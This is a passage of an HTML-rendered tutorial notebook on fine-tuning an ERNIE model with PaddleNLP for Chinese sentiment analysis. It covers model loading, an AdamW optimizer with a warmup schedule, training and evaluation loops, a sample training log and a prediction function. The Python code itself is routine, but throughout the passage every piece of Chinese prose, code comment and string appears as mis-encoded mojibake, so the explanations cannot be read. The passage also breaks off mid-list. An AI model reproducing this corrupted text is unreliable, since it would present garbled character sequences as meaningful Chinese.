<li>å¯¹äºæ¯æ¡è¯„è®ºï¼Œæ¨¡å‹ä¼šé€šè¿‡"çœ¼é•œ"ç»™å‡ºä¸€ä¸ªåˆæ­¥çš„åˆ¤æ–­ï¼ˆä¾‹å¦‚ï¼Œ"æ¶ˆæ"å¾—åˆ†0.1ï¼Œ"ç§¯æ"å¾—åˆ†0.9ï¼‰ã€‚</li>
<li>æˆ‘ä»¬æ‹¿è¿™ä¸ªåˆ¤æ–­å’ŒçœŸå®æ ‡ç­¾ï¼ˆæ¯”å¦‚è¿™æ¡è¯„è®ºçš„çœŸå®æ ‡ç­¾æ˜¯"ç§¯æ"ï¼‰å»æ¯”è¾ƒã€‚å¦‚æœåˆ¤æ–­å‡†ç¡®ï¼Œè¯´æ˜"çœ¼é•œ"æ ¡å‡†å¾—ä¸é”™ï¼›å¦‚æœåˆ¤æ–­é”™è¯¯ï¼Œå°±è®¡ç®—å‡ºä¸€ä¸ª"è¯¯å·®"ï¼ˆå³<strong>äº¤å‰ç†µæŸå¤±</strong>ï¼‰ã€‚</li>
<li>è¿™ä¸ª"è¯¯å·®"ä¿¡å·ä¼šåå‘ä¼ æ’­ï¼Œåƒä¸€ä¸ªæ ¡å‡†æŒ‡ä»¤ä¸€æ ·ï¼Œä¸ä»…ä¼šå¾®è°ƒ"é•œç‰‡"ï¼ˆåˆ†ç±»å¤´ï¼‰çš„å‚æ•°ï¼Œè®©å®ƒåˆ¤æ–­å¾—æ›´å‡†ï¼Œ<strong>æ›´é‡è¦çš„æ˜¯ï¼Œå®ƒä¹Ÿä¼šå¾®è°ƒERNIEè¿™ä½è¯­è¨€å¤§å¸ˆæœ¬èº«çš„å‚æ•°</strong>ï¼Œè®©ä»–ä»¥ååœ¨é˜…è¯»æ–‡æœ¬æ—¶ï¼Œèƒ½æ›´ä¾§é‡äºé‚£äº›ä¸æƒ…æ„Ÿç›¸å…³çš„è¯­ä¹‰ä¿¡æ¯ã€‚</li>
</ul>
</li>
</ol>
<p>ç»è¿‡æˆåƒä¸Šä¸‡æ¬¡è¿™æ ·çš„"æ ¡å‡†"ï¼ŒERNIEå¤§å¸ˆå’Œä»–çš„"æƒ…æ„Ÿåˆ†æçœ¼é•œ"å°±é…åˆå¾—å¤©è¡£æ— ç¼äº†ã€‚ä»–ä¸ä»…èƒ½è¯»æ‡‚å¥å­çš„æ„æ€ï¼Œè¿˜èƒ½å‡†ç¡®åœ°åˆ¤æ–­å‡ºå…¶ä¸­è•´å«çš„æƒ…æ„Ÿã€‚</p>
<p>[å¤§æ¨¡å‹ç²¾è°ƒåŸç†ä»‹ç»]</p>
<p>å›¾3: å¤§æ¨¡å‹ç²¾è°ƒåŸç†ç¤ºæ„å›¾ (æ¥æº: å¤§æ¨¡å‹ç²¾è°ƒæ–°æ‰‹æŒ‡å—.md)</p>
<p>ä¸Šå›¾å®è§‚åœ°å±•ç¤ºäº†å¯¹å¤§æ¨¡å‹è¿›è¡Œç²¾è°ƒçš„ä¸¤ç§ä¸»è¦æ–¹å¼ã€‚æˆ‘ä»¬æœ¬æ•™ç¨‹é‡‡ç”¨çš„æ˜¯Â <strong>SFT (Supervised Fine-Tuning)</strong> ï¼Œä¹Ÿç§°ä¸º<strong>å…¨å‚æ•°å¾®è°ƒ</strong>ã€‚è¿™æ„å‘³ç€åœ¨è®­ç»ƒè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¼šæ›´æ–°ERNIEæ¨¡å‹çš„æ‰€æœ‰å‚æ•°ï¼ˆå›¾ä¸­çš„è“è‰²éƒ¨åˆ†ï¼‰ä»¥åŠæ–°æ·»åŠ çš„åˆ†ç±»å¤´ï¼Œè®©æ•´ä¸ªæ¨¡å‹éƒ½æ¥é€‚é…æˆ‘ä»¬çš„æƒ…æ„Ÿåˆ†æä»»åŠ¡ã€‚</p>
<p>å¹¸è¿çš„æ˜¯ï¼ŒPaddleNLP çš„Â <code>AutoModelForSequenceClassification</code>Â å·²ç»å¸®æˆ‘ä»¬å®Œæˆäº†"è£…é…çœ¼é•œ"çš„å·¥ä½œã€‚æˆ‘ä»¬åªéœ€è¦åŠ è½½æ¨¡å‹ï¼Œå®ƒå°±ä¼šè‡ªåŠ¨ä¸ºæˆ‘ä»¬æ­å»ºå¥½"ERNIEå¤§å¸ˆ + åˆ†ç±»å¤´"çš„ç»“æ„ï¼Œè®©æˆ‘ä»¬èƒ½ä¸“æ³¨äº"æ ¡å‡†çœ¼é•œ"çš„è®­ç»ƒè¿‡ç¨‹ã€‚</p>
<h3 data-id="heading-17">5. æ¨¡å‹å¾®è°ƒ</h3>
<p>ç°åœ¨ï¼Œæˆ‘ä»¬å°†æ‰€æœ‰éƒ¨åˆ†ç»„åˆèµ·æ¥ï¼Œå¼€å§‹è®­ç»ƒæˆ‘ä»¬çš„æƒ…æ„Ÿåˆ†ææ¨¡å‹ã€‚æˆ‘ä»¬å°†å®šä¹‰æ¨¡å‹ã€ä¼˜åŒ–å™¨ã€æŸå¤±å‡½æ•°ï¼Œå¹¶ç¼–å†™è®­ç»ƒå’Œè¯„ä¼°çš„é€»è¾‘ã€‚</p>
<h4 data-id="heading-18">5.1 åŠ è½½æ¨¡å‹</h4>
<p>æˆ‘ä»¬ä½¿ç”¨Â <code>paddlenlp.transformers.AutoModelForSequenceClassification</code>Â æ¥åŠ è½½ä¸€ä¸ªå¸¦æœ‰åºåˆ—åˆ†ç±»å¤´çš„ERNIEæ¨¡å‹ã€‚æˆ‘ä»¬åªéœ€æŒ‡å®šé¢„è®­ç»ƒæ¨¡å‹çš„åç§°Â <code>MODEL_NAME</code>Â å’Œåˆ†ç±»çš„ç±»åˆ«æ•°Â <code>num_classes</code>ã€‚</p>
<p>In [43]</p>
<pre><code class="hljs language-ini" lang="ini">from paddlenlp.transformers import AutoModelForSequenceClassification

<span class="hljs-comment"># ç±»åˆ«æ•°é‡ (æ¶ˆæ, ç§¯æ)</span>
<span class="hljs-attr">num_classes</span> = len(train_ds.label_list)

<span class="hljs-comment"># åŠ è½½ä¸€ä¸ªé€‚åˆåˆ†ç±»ä»»åŠ¡çš„æ¨¡å‹jia</span>
<span class="hljs-attr">model</span> = AutoModelForSequenceClassification.from_pretrained(MODEL_NAME, num_classes=num_classes)

<span class="hljs-comment"># æ‰“å°æ¨¡å‹ç»“æ„</span>
print(model)
</code></pre>
<p>æ‚¨å¯ä»¥çœ‹åˆ°æ¨¡å‹ç»“æ„ï¼Œæœ€åä¸€éƒ¨åˆ†æ˜¯ä¸€ä¸ªÂ <code>(classifier): Linear</code>Â å±‚ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬æ·»åŠ çš„åˆ†ç±»å¤´ã€‚</p>
<h4 data-id="heading-19">5.2 å®šä¹‰ä¼˜åŒ–å™¨å’ŒæŸå¤±å‡½æ•°</h4>
<ul>
<li><strong>ä¼˜åŒ–å™¨ (Optimizer)</strong> Â ï¼šæˆ‘ä»¬ä½¿ç”¨ç»å…¸çš„Â <code>AdamW</code>Â ä¼˜åŒ–å™¨ï¼Œå®ƒåœ¨Transformeræ¨¡å‹çš„è®­ç»ƒä¸­è¡¨ç°è‰¯å¥½ã€‚</li>
<li><strong>å­¦ä¹ ç‡è°ƒåº¦å™¨ (Learning Rate Scheduler)</strong> Â ï¼šä¸ºäº†æ›´å¥½çš„è®­ç»ƒæ•ˆæœï¼Œæˆ‘ä»¬ä½¿ç”¨åŠ¨æ€å­¦ä¹ ç‡ã€‚è¿™é‡Œé‡‡ç”¨Â <code>LinearDecayWithWarmup</code>ï¼Œå®ƒä¼šåœ¨è®­ç»ƒåˆæœŸæœ‰ä¸€ä¸ª"é¢„çƒ­ (warmup)"é˜¶æ®µï¼Œå­¦ä¹ ç‡ä»0çº¿æ€§å¢é•¿åˆ°è®¾å®šçš„åˆå§‹å€¼ï¼Œä¹‹åå†éšç€è®­ç»ƒæ­¥æ•°çº¿æ€§è¡°å‡åˆ°0ã€‚è¿™æœ‰åŠ©äºæ¨¡å‹åœ¨è®­ç»ƒåˆæœŸæ›´ç¨³å®šï¼Œåœ¨åæœŸæ›´ç²¾ç»†åœ°æ”¶æ•›ã€‚</li>
<li><strong>æŸå¤±å‡½æ•° (Loss Function)</strong> ï¼šå¯¹äºåˆ†ç±»ä»»åŠ¡ï¼Œæˆ‘ä»¬ä½¿ç”¨æ ‡å‡†çš„<strong>äº¤å‰ç†µæŸå¤±å‡½æ•°</strong>Â <code>paddle.nn.CrossEntropyLoss</code>ã€‚</li>
<li><strong>è¯„ä¼°æŒ‡æ ‡ (Metric)</strong> ï¼šæˆ‘ä»¬ä½¿ç”¨<strong>å‡†ç¡®ç‡ (Accuracy)</strong> Â æ¥è¡¡é‡æ¨¡å‹åœ¨å¼€å‘é›†å’Œæµ‹è¯•é›†ä¸Šçš„æ€§èƒ½ã€‚</li>
</ul>
<p>In [44]</p>
<pre><code class="hljs language-ini" lang="ini">import paddle
from paddlenlp.transformers import LinearDecayWithWarmup

<span class="hljs-comment"># è®­ç»ƒçš„æ€»æ­¥æ•°</span>
<span class="hljs-attr">num_training_steps</span> = len(train_loader) * <span class="hljs-number">3</span> <span class="hljs-comment"># å‡è®¾æˆ‘ä»¬è®­ç»ƒ3ä¸ªepoch</span>

<span class="hljs-comment"># å®šä¹‰å­¦ä¹ ç‡è°ƒåº¦å™¨</span>
<span class="hljs-comment"># å‰10%å­¦ä¹ ç‡ä¼šä»0æ…¢æ…¢å¢åŠ ï¼Œåˆ°è®¾å®šçš„åˆå§‹å­¦ä¹ ç‡ï¼Œå­¦ä¹ ç‡é€æ¸å˜å¤§ï¼Œå¯ä»¥è®©æ¨¡å‹æ›´åŠ ç¨³å®šåœ°å­¦ä¹ ã€‚</span>
<span class="hljs-comment"># å†é¢„çƒ­ç»“æŸåï¼Œä¼šä»åˆå§‹å­¦ä¹ ç‡é€æ¸å‡å°‘ï¼ŒæŒ‡å¯¼è®­ç»ƒç»“æŸã€‚</span>
<span class="hljs-comment"># deacyï¼šå½“æ¨¡å‹æ¥è¿‘æ”¶æ•›æ—¶ï¼Œå­¦ä¹ ç‡å˜å¾—å¤ªå¤§ä¼šå¯¼è‡´æ¨¡å‹è·³è¿‡æœ€ä¼˜è§£ï¼Œå› æ­¤æˆ‘ä»¬å¸Œæœ›å­¦ä¹ ç‡é€æ¸å‡å°ï¼Œè®©æ¨¡å‹èƒ½ç²¾ç»†è°ƒæ•´ï¼Œæ‰¾åˆ°æœ€ä¼˜çš„å‚æ•°ã€‚</span>
<span class="hljs-attr">lr_scheduler</span> = LinearDecayWithWarmup(
    <span class="hljs-attr">learning_rate</span>=<span class="hljs-number">3</span>e-<span class="hljs-number">5</span>, <span class="hljs-comment"># åˆå§‹å­¦ä¹ ç‡</span>
    <span class="hljs-attr">total_steps</span>=num_training_steps,
    <span class="hljs-attr">warmup</span>=<span class="hljs-number">0.1</span> <span class="hljs-comment"># ä½¿ç”¨10%çš„stepsè¿›è¡Œwarmup</span>
)

<span class="hljs-comment"># å®šä¹‰ä¼˜åŒ–å™¨</span>
<span class="hljs-attr">optimizer</span> = paddle.optimizer.AdamW(
    <span class="hljs-attr">learning_rate</span>=lr_scheduler,  <span class="hljs-comment"># ä¼˜åŒ–å™¨çš„å­¦ä¹ ç‡ </span>
    <span class="hljs-attr">parameters</span>=model.parameters()  <span class="hljs-comment"># æŒ‡å®šä¼˜åŒ–å™¨è¦ä¼˜åŒ–çš„å‚æ•°ï¼Œè¿™é‡Œæ˜¯ä¼˜åŒ–æ‰€æœ‰å‚æ•°</span>
)

<span class="hljs-comment"># å®šä¹‰æŸå¤±å‡½æ•°ï¼Œäº¤å‰ç†µæŸå¤±å‡½æ•°æ˜¯åˆ†ç±»é—®é¢˜ä¸­æœ€å¸¸ç”¨çš„æŸå¤±å‡½æ•°</span>
<span class="hljs-attr">criterion</span> = paddle.nn.CrossEntropyLoss()

<span class="hljs-comment"># å®šä¹‰è¯„ä¼°æŒ‡æ ‡</span>
<span class="hljs-attr">metric</span> = paddle.metric.Accuracy()
</code></pre>
<h4 data-id="heading-20">5.3 ç¼–å†™è®­ç»ƒä¸è¯„ä¼°å¾ªç¯</h4>
<p>ç°åœ¨ï¼Œæˆ‘ä»¬ç¼–å†™æ ¸å¿ƒçš„è®­ç»ƒå’Œè¯„ä¼°é€»è¾‘ã€‚</p>
<ul>
<li>
<p><strong><code>train_epoch()</code>Â å‡½æ•°</strong>: è´Ÿè´£ä¸€ä¸ªepochçš„å®Œæ•´è®­ç»ƒæµç¨‹ã€‚</p>
<ul>
<li>å°†æ¨¡å‹è®¾ç½®ä¸ºè®­ç»ƒæ¨¡å¼ (<code>model.train()</code>)ã€‚</li>
<li>éå†Â <code>train_loader</code>Â ä¸­çš„æ‰€æœ‰æ‰¹æ¬¡ã€‚</li>
<li>å¯¹äºæ¯ä¸ªæ‰¹æ¬¡ï¼Œæ‰§è¡Œå‰å‘è®¡ç®—ã€è®¡ç®—æŸå¤±ã€åå‘ä¼ æ’­ã€æ›´æ–°å‚æ•°ã€‚</li>
<li>å®šæœŸæ‰“å°æ—¥å¿—ï¼Œæ˜¾ç¤ºå½“å‰çš„losså’Œå­¦ä¹ ç‡ç­‰ä¿¡æ¯ã€‚</li>
</ul>
</li>
<li>
<p><strong><code>evaluate()</code>Â å‡½æ•°</strong>: è´Ÿè´£åœ¨å¼€å‘é›†æˆ–æµ‹è¯•é›†ä¸Šè¿›è¡Œè¯„ä¼°ã€‚</p>
<ul>
<li>å°†æ¨¡å‹è®¾ç½®ä¸ºè¯„ä¼°æ¨¡å¼ (<code>model.eval()</code>)ã€‚</li>
<li>å…³é—­æ¢¯åº¦è®¡ç®— (<code>@paddle.no_grad()</code>) ä»¥èŠ‚çœæ˜¾å­˜å’ŒåŠ é€Ÿã€‚</li>
<li>éå†Â <code>dev_loader</code>Â ä¸­çš„æ‰€æœ‰æ‰¹æ¬¡ã€‚</li>
<li>è®¡ç®—æ¨¡å‹é¢„æµ‹çš„å‡†ç¡®ç‡ã€‚</li>
</ul>
</li>
</ul>
<p>In [45]</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> paddle.nn.functional <span class="hljs-keyword">as</span> F
<span class="hljs-keyword">import</span> os <span class="hljs-comment"># å¯¼å…¥osæ¨¡å—</span>

<span class="hljs-meta">@paddle.no_grad()  </span><span class="hljs-comment"># å…³é—­æ¢¯åº¦è®¡ç®—</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate</span>(<span class="hljs-params">model, criterion, metric, data_loader</span>):
    <span class="hljs-string">"""
    1. åœ¨ç»™å®šæ•°æ®é›†ä¸Šè¯„ä¼°æ¨¡å‹ï¼Œè¿”å›ç²¾ç¡®åº¦ã€‚
    2. model æ˜¯ä¸€ä¸ªå·²ç»å®šä¹‰å¹¶è®­ç»ƒè¿‡çš„æ·±åº¦å­¦ä¹ æ¨¡å‹ï¼Œå®ƒç”¨äºå¯¹è¾“å…¥æ•°æ®è¿›è¡Œæ¨ç†ï¼ˆå³é¢„æµ‹ï¼‰
    """</span>
    model.<span class="hljs-built_in">eval</span>()  <span class="hljs-comment"># è®¾ç½®æ¨¡å‹ä¸ºè¯„ä¼°æ¨¡å¼</span>
    metric.reset()  <span class="hljs-comment"># é‡ç½®è¯„ä¼°æŒ‡æ ‡</span>
    losses = []  <span class="hljs-comment"># ç”¨æ¥å­˜å‚¨æ¯ä¸ªæ‰¹æ¬¡çš„æŸå¤±</span>
    <span class="hljs-keyword">for</span> batch <span class="hljs-keyword">in</span> data_loader:
        input_ids, token_type_ids, labels = batch[<span class="hljs-string">'input_ids'</span>], batch[<span class="hljs-string">'token_type_ids'</span>], batch[<span class="hljs-string">'labels'</span>]
        
        logits = model(input_ids, token_type_ids)  <span class="hljs-comment"># å‰å‘è®¡ç®—ï¼Œå¾—åˆ°æ¨¡å‹è¾“å‡º</span>
        loss = criterion(logits, labels)  <span class="hljs-comment"># è®¡ç®—æŸå¤±</span>
        losses.append(loss.numpy()) <span class="hljs-comment"># å°†æŸå¤±å€¼æ·»åŠ åˆ°æŸå¤±åˆ—è¡¨</span>
        
        correct = metric.compute(logits, labels) <span class="hljs-comment"># è®¡ç®—å½“å‰æ‰¹æ¬¡çš„å‡†ç¡®åº¦</span>
        metric.update(correct)  <span class="hljs-comment"># æ›´æ–°è¯„ä¼°æŒ‡æ ‡</span>
        
    accuracy = metric.accumulate()  <span class="hljs-comment"># è®¡ç®—æ•´ä½“å‡†ç¡®ç‡</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Eval loss: <span class="hljs-subst">{paddle.to_tensor(losses).mean().item():<span class="hljs-number">.5</span>f}</span>, Accuracy: <span class="hljs-subst">{accuracy:<span class="hljs-number">.5</span>f}</span>"</span>)
    model.train()  <span class="hljs-comment"># å°†æ¨¡å‹æ¢å¤ä¸ºè®­ç»ƒæ¨¡å¼</span>
    <span class="hljs-keyword">return</span> accuracy


<span class="hljs-keyword">def</span> <span class="hljs-title function_">do_train</span>(<span class="hljs-params">epochs=<span class="hljs-number">3</span></span>):
    <span class="hljs-string">"""
    æ‰§è¡Œå®Œæ•´çš„è®­ç»ƒå’Œè¯„ä¼°æµç¨‹ã€‚
    """</span>
    best_accuracy = <span class="hljs-number">0.0</span>   <span class="hljs-comment"># åˆå§‹åŒ–æœ€ä½³å‡†ç¡®ç‡</span>
    <span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, epochs + <span class="hljs-number">1</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n--- Epoch <span class="hljs-subst">{epoch}</span> ---"</span>)
        
        <span class="hljs-comment"># è®­ç»ƒ</span>
        model.train()  <span class="hljs-comment"># è®¾ç½®æ¨¡å‹ä¸ºè®­ç»ƒæ¨¡å¼</span>
        <span class="hljs-keyword">for</span> step, batch <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(train_loader, start=<span class="hljs-number">1</span>):
            input_ids, token_type_ids, labels = batch[<span class="hljs-string">'input_ids'</span>], batch[<span class="hljs-string">'token_type_ids'</span>], batch[<span class="hljs-string">'labels'</span>]
            
            <span class="hljs-comment"># å‰å‘è®¡ç®—</span>
            logits = model(input_ids, token_type_ids)
            
            <span class="hljs-comment"># è®¡ç®—æŸå¤±</span>
            loss = criterion(logits, labels)
            
            <span class="hljs-comment"># æ¯100æ­¥æ‰“å°ä¸€æ¬¡log</span>
            <span class="hljs-keyword">if</span> step % <span class="hljs-number">100</span> == <span class="hljs-number">0</span>:
                <span class="hljs-built_in">print</span>(
                    <span class="hljs-string">f"Epoch <span class="hljs-subst">{epoch}</span>, Step <span class="hljs-subst">{step}</span>/<span class="hljs-subst">{<span class="hljs-built_in">len</span>(train_loader)}</span>, "</span>
                    <span class="hljs-string">f"Loss: <span class="hljs-subst">{loss.item():<span class="hljs-number">.5</span>f}</span>, "</span>
                    <span class="hljs-string">f"LR: <span class="hljs-subst">{lr_scheduler.get_lr():<span class="hljs-number">.7</span>f}</span>"</span>
                )
            
            <span class="hljs-comment"># åå‘ä¼ æ’­å’Œå‚æ•°æ›´æ–°</span>
            loss.backward()  <span class="hljs-comment"># è®¡ç®—æ¢¯åº¦</span>
            optimizer.step()  <span class="hljs-comment"># æ›´æ–°æ¨¡å‹å‚æ•°</span>
            lr_scheduler.step()  <span class="hljs-comment"># æ›´æ–°å­¦ä¹ ç‡</span>
            optimizer.clear_grad()  <span class="hljs-comment"># æ¸…é™¤æ¢¯åº¦ï¼Œä¸ºä¸‹ä¸€æ¬¡è¿­ä»£åšå‡†å¤‡</span>

        <span class="hljs-comment"># æ¯ä¸ªepochç»“æŸåï¼Œåœ¨å¼€å‘é›†ä¸Šè¿›è¡Œè¯„ä¼°</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"--- Evaluating on Dev Set after Epoch <span class="hljs-subst">{epoch}</span> ---"</span>)
        accuracy = evaluate(model, criterion, metric, dev_loader)
        
        <span class="hljs-comment"># ä¿å­˜è¡¨ç°æœ€å¥½çš„æ¨¡å‹</span>
        <span class="hljs-keyword">if</span> accuracy &gt; best_accuracy:
            best_accuracy = accuracy
            <span class="hljs-comment"># åˆ›å»ºä¿å­˜ç›®å½•</span>
            save_dir = <span class="hljs-string">"ernie_senti_checkpoint_best"</span>
            os.makedirs(save_dir, exist_ok=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># åˆ›å»ºç›®å½•ï¼Œå¦‚æœå·²å­˜åœ¨åˆ™ä¸æŠ¥é”™</span>
            <span class="hljs-comment"># ä¿å­˜æ¨¡å‹å’Œtokenizer</span>
            model.save_pretrained(save_dir)
            tokenizer.save_pretrained(save_dir)  <span class="hljs-comment"># ä¿å­˜è®­ç»ƒå¥½çš„æ¨¡å‹</span>
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Best model saved with accuracy: <span class="hljs-subst">{best_accuracy:<span class="hljs-number">.5</span>f}</span> at '<span class="hljs-subst">{save_dir}</span>'"</span>)  <span class="hljs-comment"># ä¿å­˜æ¨¡å‹ä½¿ç”¨çš„åˆ†è¯å™¨ </span>

<span class="hljs-comment"># å¼€å§‹è®­ç»ƒï¼</span>
<span class="hljs-comment"># é€šå¸¸åœ¨GPUä¸Šï¼Œæ¯ä¸ªepochå¤§çº¦éœ€è¦å‡ åˆ†é’Ÿã€‚</span>
do_train(epochs=<span class="hljs-number">3</span>)
</code></pre>
<p><strong>æ—¥å¿—è§£è¯»</strong>ï¼š åœ¨è®­ç»ƒè¿‡ç¨‹ä¸­ï¼Œæ‚¨ä¼šçœ‹åˆ°ç±»ä¼¼ä¸‹é¢çš„æ—¥å¿—ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">---</span> <span class="hljs-string">Epoch</span> <span class="hljs-number">1</span> <span class="hljs-string">---</span>
<span class="hljs-string">Epoch</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-string">Step</span> <span class="hljs-number">100</span><span class="hljs-string">/300,</span> <span class="hljs-attr">Loss:</span> <span class="hljs-number">0.34567</span><span class="hljs-string">,</span> <span class="hljs-attr">LR:</span> <span class="hljs-number">0.0000280</span>
<span class="hljs-string">Epoch</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-string">Step</span> <span class="hljs-number">200</span><span class="hljs-string">/300,</span> <span class="hljs-attr">Loss:</span> <span class="hljs-number">0.21345</span><span class="hljs-string">,</span> <span class="hljs-attr">LR:</span> <span class="hljs-number">0.0000250</span>
<span class="hljs-string">Epoch</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-string">Step</span> <span class="hljs-number">300</span><span class="hljs-string">/300,</span> <span class="hljs-attr">Loss:</span> <span class="hljs-number">0.18765</span><span class="hljs-string">,</span> <span class="hljs-attr">LR:</span> <span class="hljs-number">0.0000220</span>
<span class="hljs-string">---</span> <span class="hljs-string">Evaluating</span> <span class="hljs-string">on</span> <span class="hljs-string">Dev</span> <span class="hljs-string">Set</span> <span class="hljs-string">after</span> <span class="hljs-string">Epoch</span> <span class="hljs-number">1</span> <span class="hljs-string">---</span>
<span class="hljs-attr">Eval loss:</span> <span class="hljs-number">0.25012</span><span class="hljs-string">,</span> <span class="hljs-attr">Accuracy:</span> <span class="hljs-number">0.92500</span>
<span class="hljs-attr">Best model saved with accuracy:</span> <span class="hljs-number">0.92500</span> <span class="hljs-string">at</span> <span class="hljs-string">'ernie_senti_checkpoint_best'</span>
</code></pre>
<p>æˆ‘ä»¬æœŸæœ›çœ‹åˆ°ï¼š</p>
<ul>
<li><strong>Loss</strong>ï¼šåœ¨è®­ç»ƒè¿‡ç¨‹ä¸­ç¨³æ­¥ä¸‹é™ã€‚</li>
<li><strong>Accuracy</strong>ï¼šåœ¨å¼€å‘é›†ä¸Šçš„å‡†ç¡®ç‡ç¨³æ­¥æå‡ã€‚</li>
<li><strong>æ¨¡å‹ä¿å­˜</strong>ï¼šå½“å¼€å‘é›†ä¸Šçš„å‡†ç¡®ç‡è¶…è¿‡ä¹‹å‰çš„æœ€ä½³è®°å½•æ—¶ï¼Œæ¨¡å‹ä¼šè¢«ä¿å­˜åˆ°Â <code>ernie_senti_checkpoint_best</code>Â ç›®å½•ä¸­ã€‚</li>
</ul>
<p>è®­ç»ƒå®Œæˆåï¼Œè¿™ä¸ªç›®å½•é‡Œå°±åŒ…å«äº†æˆ‘ä»¬æ€§èƒ½æœ€å¥½çš„æƒ…æ„Ÿåˆ†ææ¨¡å‹ã€‚</p>
<h3 data-id="heading-21">6. æ¨¡å‹é¢„æµ‹</h3>
<p>è®­ç»ƒå®Œæˆåï¼Œå¹¶ä½¿ç”¨å®ƒæ¥å¯¹æ–°æ–‡æœ¬è¿›è¡Œæƒ…æ„Ÿé¢„æµ‹ã€‚</p>
<p>In [46]</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åŠ è½½ä¹‹å‰ä¿å­˜çš„æœ€ä½³æ¨¡å‹</span>
<span class="hljs-comment"># å¦‚æœè®­ç»ƒä¸­æ–­æˆ–åœ¨ä¸åŒç¯å¢ƒä¸­è¿è¡Œï¼Œè¯·ç¡®ä¿ 'ernie_senti_checkpoint_best' ç›®å½•å­˜åœ¨</span>
<span class="hljs-comment"># å¹¶ä¸”å…¶ä¸­åŒ…å«æ¨¡å‹æ–‡ä»¶</span>

save_dir = <span class="hljs-string">"ernie_senti_checkpoint_best"</span>

<span class="hljs-keyword">try</span>:
    <span class="hljs-comment"># é‡æ–°åŠ è½½æœ€ä½³æ¨¡å‹å’Œå¯¹åº”çš„tokenizer</span>
    model = AutoModelForSequenceClassification.from_pretrained(save_dir)
    tokenizer = AutoTokenizer.from_pretrained(save_dir)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æœ€ä½³æ¨¡å‹å·²æˆåŠŸåŠ è½½ï¼"</span>)
    
<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"åŠ è½½æ¨¡å‹æˆ–è¯„ä¼°æ—¶å‘ç”Ÿé”™è¯¯: <span class="hljs-subst">{e}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"è¯·ç¡®ä¿è®­ç»ƒå·²æˆåŠŸå®Œæˆï¼Œå¹¶ä¸”'ernie_senti_checkpoint_best'ç›®å½•å­˜åœ¨ä¸”åŒ…å«æ¨¡å‹æ–‡ä»¶ã€‚"</span>)
</code></pre>
<p>ç°åœ¨ï¼Œè®©æˆ‘ä»¬æ¥åˆ›å»ºä¸€ä¸ªç®€å•æ˜“ç”¨çš„é¢„æµ‹å‡½æ•°ï¼Œå®ƒå¯ä»¥æ¥æ”¶ä¸€ä¸ªæˆ–å¤šä¸ªä¸­æ–‡å¥å­ï¼Œå¹¶è¿”å›å®ƒä»¬çš„æƒ…æ„Ÿåˆ†æç»“æœã€‚</p>
<p>In [47]</p>
<pre><code class="hljs language-python" lang="python">   <span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np

<span class="hljs-keyword">def</span> <span class="hljs-title function_">predict</span>(<span class="hljs-params">model, tokenizer, texts, label_map</span>):
    <span class="hljs-string">"""
    ç»™å®šæ¨¡å‹ã€åˆ†è¯å™¨ã€æ–‡æœ¬åˆ—è¡¨å’Œæ ‡ç­¾æ˜ å°„ï¼Œé¢„æµ‹æƒ…æ„Ÿã€‚
    """</span>
    <span class="hljs-comment"># å°†æ¨¡å‹è®¾ç½®ä¸ºè¯„ä¼°æ¨¡å¼</span>
    model.<span class="hljs-built_in">eval</span>()
    
    <span class="hljs-comment"># å¯¹è¾“å…¥æ–‡æœ¬è¿›è¡Œåˆ†è¯å’Œå¤„ç†</span>
    <span class="hljs-comment"># textså¯ä»¥æ˜¯å•ä¸ªå­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²åˆ—è¡¨</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(texts, <span class="hljs-built_in">str</span>):
        texts = [texts]
        
    encoded_inputs = tokenizer(text=texts, max_seq_len=<span class="hljs-number">128</span>, padding=<span class="hljs-literal">True</span>)
    input_ids = paddle.to_tensor(encoded_inputs[<span class="hljs-string">"input_ids"</span>])
    token_type_ids = paddle.to_tensor(encoded_inputs[<span class="hljs-string">"token_type_ids"</span>])
    
    <span class="hljs-comment"># å…³é—­æ¢¯åº¦è®¡ç®—</span>
    <span class="hljs-keyword">with</span> paddle.no_grad():
        logits = model(input_ids, token_type_ids)
    
    <span class="hljs-comment"># é€šè¿‡softmaxè·å–æ¦‚ç‡ï¼Œå¹¶é€šè¿‡argmaxè·å–æœ€å¯èƒ½çš„ç±»åˆ«ç´¢å¼•</span>
    probs = F.softmax(logits, axis=<span class="hljs-number">1</span>)
    label_ids = paddle.argmax(probs, axis=<span class="hljs-number">1</span>).numpy()
    
    <span class="hljs-comment"># å°†ç±»åˆ«ç´¢å¼•æ˜ å°„å›æ ‡ç­¾æ–‡å­—</span>
    results = [label_map[label_id] <span class="hljs-keyword">for</span> label_id <span class="hljs-keyword">in</span> label_ids]
    
    <span class="hljs-keyword">return</span> results

<span class="hljs-comment"># å®šä¹‰æ ‡ç­¾æ˜ å°„</span>
label_map = {<span class="hljs-number">0</span>: <span class="hljs-string">'æ¶ˆæ'</span>, <span class="hljs-number">1</span>: <span class="hljs-string">'ç§¯æ'</span>}

<span class="hljs-comment"># å¾…é¢„æµ‹çš„æ•°æ®</span>
data_to_predict = [
    <span class="hljs-string">'è¿™å®¶é…’åº—çš„æ—©é¤å¤ªå¥½åƒäº†ï¼Œä¸‹æ¬¡è¿˜æ¥ï¼'</span>,
